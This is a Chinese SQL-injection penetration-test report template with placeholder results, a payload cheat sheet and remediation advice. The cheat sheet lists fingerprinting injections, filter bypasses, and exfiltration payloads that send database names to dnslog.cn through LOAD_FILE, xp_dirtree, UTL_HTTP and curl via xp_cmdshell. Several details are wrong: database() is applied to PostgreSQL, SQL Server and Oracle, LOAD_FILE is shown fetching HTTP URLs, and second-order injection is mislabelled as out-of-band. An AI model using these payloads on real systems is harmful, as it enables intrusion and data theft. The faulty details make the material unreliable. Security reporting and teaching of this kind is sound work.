# SQL 注入渗透测试报告模板

## 1. 测试概览

### 1.1 基本信息
- **测试目标**: [目标 URL/应用程序]
- **测试时间**: [日期]
- **测试人员**: [姓名]
- **测试范围**: [范围描述]

### 1.2 测试结果摘要

| 级别 | 状态 | 漏洞类型 | 数据库类型 | 风险等级 |
|------|------|----------|------------|----------|
| [编号] | [✓/✗] | [类型] | [数据库] | [高/中/低] |

**成功利用**: [数量]/[总数] ([百分比]%)

---

## 2. 详细测试结果

### 2.0 MCP SQLMap 自动扫描结果

**扫描目标**: [目标 URL/应用程序]

**扫描时间**: [日期]

**扫描任务 ID**: [task_id]

**HTTP 请求**:
```
[HTTP 请求报文]
```

**扫描状态**: [pending/running/completed/failed]

**扫描结果**:
```
[MCP SQLMap 扫描输出]
```

**检测到的注入类型**:
- [ ] Boolean 盲注
- [ ] 报错注入
- [ ] 时间盲注
- [ ] 联合查询注入

**数据库信息**:
- 数据库类型: [MySQL/PostgreSQL/SQL Server/Oracle/SQLite]
- 数据库版本: [版本号]
- 当前数据库: [数据库名]
- 当前用户: [用户名]

**漏洞详情**:
- 注入点: [参数名]
- 成功 Payload: [Payload 内容]
- 漏洞可利用性: [是/否]

**扫描结论**: [漏洞存在/未发现漏洞]

---

### 2.1 [漏洞名称]

**测试位置**: [URL/参数/输入点]

**漏洞类型**: [经典注入/盲注/时间盲注/二阶注入/堆叠查询注入]

**数据库类型**: [MySQL/PostgreSQL/SQL Server/Oracle/SQLite]

**服务器代码**:
```sql
[相关代码片段]
```

**漏洞分析**:
- [分析点 1]
- [分析点 2]
- [关键知识点]

**成功 Payload**:
```sql
[Payload 内容]
```

**攻击原理**:
1. [步骤 1]
2. [步骤 2]
3. [步骤 3]
4. [结果验证]

**数据提取**:
- 数据库名: [数据库名]
- 表名: [表名]
- 列名: [列名]
- 敏感数据: [数据]

**风险等级**: [高/中/低]
**CVSS 评分**: [评分] ([等级])

**修复建议**:
- [建议 1]
- [建议 2]
- [建议 3]

---

## 3. 核心知识点总结

### 3.1 数据库类型识别

1. **MySQL 识别**:
   - `' OR 1=1--`
   - `' OR 1=1#`
   - `' AND SLEEP(5)--`

2. **PostgreSQL 识别**:
   - `' OR 1=1--`
   - `' AND 1=CAST((SELECT 1) AS INT)--`
   - `' AND pg_sleep(5)--`

3. **SQL Server 识别**:
   - `' OR 1=1--`
   - `' AND 1=CONVERT(INT,(SELECT 1))--`
   - `' AND WAITFOR DELAY '0:0:5'--`

4. **Oracle 识别**:
   - `' OR '1'='1'--`
   - `' AND 1=CAST((SELECT 1) AS NUMBER)--`
   - `' AND DBMS_PIPE.RECEIVE_MESSAGE('X',5)--`

### 3.2 注入类型分类

1. **经典注入（In-band）**:
   - 联合查询注入：使用 UNION SELECT 提取数据
   - 错误注入：利用错误信息泄露数据

2. **盲注（Inferential）**:
   - 布尔盲注：根据响应差异判断条件真假
   - 时间盲注：根据响应时间判断条件真假

3. **二阶注入（Out-of-band）**:
   - 存储后触发：恶意代码先存储，后执行
   - 延迟执行：恶意代码在后续查询中执行

4. **堆叠查询注入**:
   - 多语句执行：使用分号执行多个 SQL 语句
   - 数据库特定：需要数据库支持堆叠查询

### 3.3 过滤绕过技巧

1. **空格过滤绕过**:
   - 使用注释符：`/**/` 替代空格
   - 使用换行符：`%0A` 替代空格
   - 使用制表符：`%09` 替代空格
   - 使用括号：`()` 替代空格

2. **注释符过滤绕过**:
   - 使用其他注释符：`#`、`;`、`%00`
   - 使用内联注释：`/*!*/`
   - 使用版本注释：`/*!00000*/`

3. **关键字过滤绕过**:
   - 大小写绕过：混合大小写
   - 双写绕过：双写关键字
   - 特殊字符绕过：使用特殊字符分割

4. **特殊字符过滤绕过**:
   - 单引号过滤：使用十六进制、双引号、CHAR 函数
   - 等号过滤：使用 LIKE、REGEXP、BETWEEN、IN、<>
   - 逗号过滤：使用 JOIN、OFFSET、CASE WHEN

### 3.4 数据外带技术

1. **DNS 外带**:
   - MySQL：`SELECT LOAD_FILE(CONCAT('\\\\', (SELECT database()), '.dnslog.cn\\test'))`
   - PostgreSQL：`SELECT dblink_send_query('dnslog.cn', 'SELECT 1')`
   - SQL Server：`EXEC master..xp_dirtree '\\\\' + @host + '\\test'`
   - Oracle：`SELECT UTL_HTTP.REQUEST('http://' || (SELECT database()) || '.dnslog.cn')`

2. **HTTP 外带**:
   - MySQL：`SELECT LOAD_FILE('http://dnslog.cn/' || (SELECT database()))`
   - PostgreSQL：`COPY (SELECT database()) TO PROGRAM 'curl http://dnslog.cn/' || (SELECT database())`
   - SQL Server：`EXEC xp_cmdshell 'curl http://dnslog.cn/' + (SELECT DB_NAME())`

3. **文件外带**:
   - MySQL：`SELECT (SELECT database()) INTO OUTFILE '/tmp/database.txt'`
   - PostgreSQL：`COPY (SELECT database()) TO '/tmp/database.txt'`
   - SQL Server：`EXEC xp_cmdshell 'echo ' + (SELECT DB_NAME()) + ' > C:\\database.txt'`

4. **错误外带**:
   - MySQL：`AND 1=EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database()),0x7e))`
   - PostgreSQL：`AND 1=CAST((SELECT database()) AS INT)`
   - SQL Server：`AND 1=CONVERT(INT,(SELECT database()))`
   - Oracle：`AND 1=CAST((SELECT database()) AS NUMBER)`

5. **时间外带**:
   - MySQL：`AND IF((SELECT database())='testdb',SLEEP(5),0)`
   - PostgreSQL：`AND CASE WHEN (SELECT database())='testdb' THEN pg_sleep(5) ELSE 0 END`
   - SQL Server：`AND CASE WHEN (SELECT DB_NAME())='testdb' THEN WAITFOR DELAY '0:0:5' ELSE 0 END`
   - Oracle：`AND CASE WHEN (SELECT SYS.DATABASE_NAME FROM dual)='TESTDB' THEN DBMS_PIPE.RECEIVE_MESSAGE('X',5) ELSE 0 END`

---

## 4. 修复建议汇总

### 4.1 输入验证

- 对所有用户输入进行严格的验证和过滤
- 使用白名单机制限制允许的输入
- 避免使用黑名单机制（容易被绕过）
- 实施类型检查和长度限制

### 4.2 参数化查询

- 使用预处理语句（Prepared Statements）
- 使用存储过程（Stored Procedures）
- 使用 ORM 框架（Object-Relational Mapping）
- 避免直接拼接 SQL 语句

### 4.3 最小权限原则

- 限制数据库用户权限
- 禁用危险函数（如 LOAD_FILE、xp_cmdshell）
- 禁止文件读写操作
- 定期审查和更新权限

### 4.4 错误处理

- 不显示详细错误信息
- 使用通用错误消息
- 记录错误日志
- 实施适当的错误处理机制

### 4.5 WAF 部署

- 部署 Web 应用防火墙（WAF）
- 配置适当的规则
- 定期更新规则库
- 监控和分析攻击日志

---

## 5. 数据库特定修复建议

### 5.1 MySQL 修复建议

```python
# 使用参数化查询
import mysql.connector

def get_user(user_id):
    conn = mysql.connector.connect(user='root', password='password', host='localhost', database='test')
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))
    result = cursor.fetchall()
    conn.close()
    return result

# 创建受限用户
CREATE USER 'webapp'@'localhost' IDENTIFIED BY 'password';
GRANT SELECT, INSERT, UPDATE ON testdb.users TO 'webapp'@'localhost';
REVOKE FILE ON *.* FROM 'webapp'@'localhost';
```

### 5.2 PostgreSQL 修复建议

```python
# 使用参数化查询
import psycopg2

def get_user(user_id):
    conn = psycopg2.connect(user='postgres', password='password', host='localhost', database='test')
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))
    result = cursor.fetchall()
    conn.close()
    return result

# 创建受限用户
CREATE USER webapp WITH PASSWORD 'password';
GRANT SELECT, INSERT, UPDATE ON testdb.users TO webapp;
REVOKE ALL ON SCHEMA public FROM webapp;
```

### 5.3 SQL Server 修复建议

```python
# 使用参数化查询
import pyodbc

def get_user(user_id):
    conn = pyodbc.connect('DRIVER={SQL Server};SERVER=localhost;DATABASE=test;UID=sa;PWD=password')
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM users WHERE id = ?", (user_id,))
    result = cursor.fetchall()
    conn.close()
    return result

# 创建受限用户
CREATE LOGIN webapp WITH PASSWORD = 'password';
CREATE USER webapp FOR LOGIN webapp;
GRANT SELECT, INSERT, UPDATE ON testdb.users TO webapp;
REVOKE EXECUTE ON xp_cmdshell FROM webapp;
```

### 5.4 Oracle 修复建议

```python
# 使用参数化查询
import cx_Oracle

def get_user(user_id):
    conn = cx_Oracle.connect('user/password@localhost:1521/test')
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM users WHERE id = :id", {"id": user_id})
    result = cursor.fetchall()
    conn.close()
    return result

# 创建受限用户
CREATE USER webapp IDENTIFIED BY password;
GRANT SELECT, INSERT, UPDATE ON testdb.users TO webapp;
REVOKE EXECUTE ON UTL_HTTP FROM webapp;
```

---

## 6. 结论

### 6.1 测试总结

本次渗透测试成功利用了 [数量] 个 SQL 注入漏洞，成功率 [百分比]%。测试涵盖了多种 SQL 注入攻击向量和绕过技术，包括经典注入、盲注、时间盲注、二阶注入和堆叠查询注入。

### 6.2 关键发现

1. [发现 1]
2. [发现 2]
3. [发现 3]

### 6.3 建议措施

1. 始终使用参数化查询
2. 实施严格的输入验证
3. 遵循最小权限原则
4. 部署 Web 应用防火墙
5. 定期进行安全测试和代码审计

### 6.4 风险评估

| 风险等级 | 漏洞数量 | 影响 |
|----------|----------|------|
| 高 | [数量] | 能够提取敏感数据、执行系统命令、完全控制数据库 |
| 中 | [数量] | 能够提取非敏感数据、绕过认证、修改数据 |
| 低 | [数量] | 仅能证明漏洞存在、无法提取有用数据 |

---

## 7. 附录

### 7.1 测试工具

#### MCP SQLMap
- 自动化 SQL 注入检测
- 支持异步任务处理
- 完整的 HTTP 请求分析
- 智能识别 4 种注入类型

#### 其他工具
- SQLMap
- Burp Suite
- OWASP ZAP
- SQLNinja
- Havij

### 7.2 参考资料

- OWASP SQL 注入防护速查表
- PortSwigger SQL 注入实验室
- SQLMap 官方文档
- MCP SQLMap 使用指南
- CWE-89: SQL 注入

### 7.3 MCP SQLMap 扫描记录

| 任务 ID | 目标 URL | 扫描状态 | 检测到的注入类型 | 数据库类型 | 扫描时间 |
|---------|----------|----------|------------------|------------|----------|
| [task_id] | [URL] | [状态] | [注入类型] | [数据库] | [时间] |
| [task_id] | [URL] | [状态] | [注入类型] | [数据库] | [时间] |

### 7.4 法律声明

本报告仅用于授权的安全测试目的。未经授权的渗透测试是非法的。测试人员应遵守所有适用的法律法规和道德准则。

---

**报告生成时间**: [日期]
**报告版本**: [版本号]
**测试人员**: [姓名]
